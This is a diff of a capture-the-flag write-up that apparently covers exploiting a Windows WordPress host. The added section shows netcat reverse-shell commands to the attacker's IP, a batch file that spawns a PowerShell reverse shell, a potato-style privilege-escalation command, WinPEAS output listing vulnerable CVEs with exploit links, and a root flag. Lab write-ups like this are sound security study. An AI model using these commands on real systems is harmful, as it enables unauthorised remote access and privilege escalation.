@@ -65,7 +65,7 @@ testcookie=1 might be preventing us from actually sending in a valid login reque
 
 ---
 
-## Sending the request with testcookie=0 doesn'T return anything different.
+## Sending the request with testcookie=0 doesn't return anything different.
 
 ---
 
@@ -145,7 +145,7 @@ We upload `Netcat` on the target machine.
 
 We setup a listener locally and run the uploaded program.
 ```
-msf > execute -f nc.exe -a "-e cmd.exe 10.10.16.100 4443"
+msf > execute -f nc.exe -a "-e cmd.exe 10.10.16.133 4443"
 ```
 
 ---
@@ -173,4 +173,84 @@ Process 4808 created.
 
 ---
 
-I am out of time and this is it for now.
+## Got back the second day.
+
+I fixed the local host problem with `metasploit` and got the exploit up and running.
+
+---
+
+## NetCat
+
+I downloaded the `nc.exe` and uploaded it to the target system.
+
+This is the 32 bit version an I renamed it.
+
+Now we can run it on the target system to get a stable shell.
+```
+execute -f nc32.exe -a "-e cmd.exe 10.10.16.133 443"
+```
+
+---
+
+## Now we can upload rotten potato and continue.
+
+Since the files from last session is still present and I can't upload the files with the same name. Also I cannot delete them on the target system for some reason, so I renamed everything.
+
+---
+
+## The potato didn't work.
+
+Mostly my fault because I forgot to change the command line script and fix the `shell.bat` to use my port.
+
+But I did upload `WinPEAS` to see how else I could exploit it and there are quite a bit of options there. 6 at the very least. Far more if you want to do path injections.
+
+Here is a sniplet:
+```
+[!] CVE-2019-1064 : VULNERABLE
+  [>] https://www.rythmstick.net/posts/cve-2019-1064/
+
+ [!] CVE-2019-1130 : VULNERABLE
+  [>] https://github.com/S3cur3Th1sSh1t/SharpByeBear
+
+ [!] CVE-2019-1315 : VULNERABLE
+  [>] https://offsec.almond.consulting/windows-error-reporting-arbitrary-file-move-eop.html
+
+ [!] CVE-2019-1388 : VULNERABLE
+  [>] https://github.com/jas502n/CVE-2019-1388
+
+ [!] CVE-2019-1405 : VULNERABLE
+  [>] https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/
+  [>] https://github.com/apt69/COMahawk
+
+ [!] CVE-2020-1013 : VULNERABLE
+  [>] https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/
+
+ [*] Finished. Found 6 potential vulnerabilities.
+```
+
+---
+
+## Creating the shell script.
+
+Creating the `shell_cp.bat`
+```
+echo START C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell.exe 10.10.16.133 4443 > shell_cp.bat
+```
+
+---
+
+## Running the script to get admin shell back.
+
+
+```
+js_cpy.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\uploads\shell_cp.bat -l 1337 -c {bb6df56b-cace-11dc-9992-0019b93a3a84}
+```
+
+---
+
+## And we are done.
+
+```
+root.txt:
+	~~6e9a9fdc6f64e410a68b847bb4b404fa~~
+```
